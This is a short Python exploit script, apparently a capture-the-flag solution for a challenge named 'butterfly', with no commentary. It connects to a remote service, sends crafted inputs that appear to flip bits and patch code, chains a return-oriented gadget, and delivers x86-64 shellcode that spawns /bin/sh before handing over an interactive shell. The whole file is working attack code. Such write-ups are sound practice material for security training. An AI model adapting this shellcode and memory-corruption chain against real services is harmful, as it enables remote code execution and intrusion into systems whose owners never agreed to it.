#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.23"
#port = 8888
host = "butterfly.pwning.xxx"
port = 9999


sock = make_conn(host,port)

pop_r12 = 0x00000000004008ec # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

#recvuntil(sock,"RAY?")
raw_input()
sendline(sock,str(0x0000000000400860 << 3).ljust(0x30-0x10,"a") + pack(0x0000000000400788) )
raw_input()
sendline(sock,str(0x00000000004007c5 << 3).ljust(0x30-0x10,"b") + pack(0x0000000000400788))  
raw_input()
sendline(sock,str(0x000000000040085b << 3).ljust(0x30-0x10,"b") + pack(0x0000000000400788) + "g"*0x80)  
raw_input()
sendline(sock,str(0x00000000004007bf << 3).ljust(0x30-0x10,"b") + pack(pop_r12) + pack(0x0000000000600cd0) + pack(0) + pack(0) + pack(0) + pack(0x00000000004007b8)+ str(0x600cd8 << 3)*1 + pack(0))
raw_input()
sendline(sock,pack(0x600cd8) + "\x91" + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
inter(sock)
